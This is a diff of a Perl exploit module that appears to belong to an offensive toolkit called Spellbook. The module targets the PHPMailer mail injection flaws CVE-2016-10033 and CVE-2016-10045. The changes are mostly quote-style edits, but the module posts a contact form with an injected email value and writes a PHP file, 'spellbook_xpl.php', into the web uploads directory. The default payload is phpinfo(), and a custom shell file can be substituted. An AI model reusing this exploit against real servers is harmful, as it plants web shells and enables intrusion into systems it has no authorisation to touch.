@@ -4,22 +4,24 @@ package Spellbook::Advisory::CVE_2016_10045 {
     use Try::Tiny;
     use Spellbook::Core::UserAgent;
 
+    our $VERSION = '0.0.1';
+
     sub new {
         my ($self, $parameters) = @_;
         my ($help, $target, @results);
         
-        my $dir   = "/var/www/html/uploads";
+        my $dir   = '/var/www/html/uploads';
         my %shell = (
-            "name" => "spellbook_xpl.php",
-            "code" => "<?php phpinfo(); ?>"
+            'name' => 'spellbook_xpl.php',
+            'code' => '<?php phpinfo(); ?>'
         );
 
         Getopt::Long::GetOptionsFromArray (
             $parameters,
-            "h|help"        => \$help,
-            "t|target=s"    => \$target,
-            "S|shell=s"     => \$shell{name},
-            "d|directory=s" => \$dir
+            'h|help'        => \$help,
+            't|target=s'    => \$target,
+            'S|shell=s'     => \$shell{name},
+            'd|directory=s' => \$dir
         );
         
         if ($target) {
@@ -29,7 +31,7 @@ package Spellbook::Advisory::CVE_2016_10045 {
 
             my $userAgent = Spellbook::Core::UserAgent -> new();
 
-            if ($shell{"name"} ne "spellbook_xpl.php") {
+            if ($shell{'name'} ne 'spellbook_xpl.php') {
                 my $code = Mojo::File -> new($shell{name});
 
                 $shell{code} = $code -> slurp();
@@ -40,21 +42,21 @@ package Spellbook::Advisory::CVE_2016_10045 {
             
             try {
                 my $request = $userAgent -> post($target, [
-                    "action"  => "send",
-                    "name"    => "Jas Fasola",
-                    "subject" => "Lorem ipsum",
-                    "email"   => $CVE_2016_10033,
-                    "message" => $shell{code}
+                    'action'  => "send",
+                    'name'    => "Jas Fasola",
+                    'subject' => "Lorem ipsum",
+                    'email'   => $CVE_2016_10033,
+                    'message' => $shell{code}
                 ]);
             }
 
             catch {
                 my $request = $userAgent -> post($target, [
-                    "action"  => "send",
-                    "name"    => "Jas Fasola",
-                    "subject" => "Lorem ipsum",
-                    "email"   => $CVE_2016_10045,
-                    "message" => $shell{code}
+                    'action'  => "send",
+                    'name'    => "Jas Fasola",
+                    'subject' => "Lorem ipsum",
+                    'email'   => $CVE_2016_10045,
+                    'message' => $shell{code}
                 ]);
             };
 
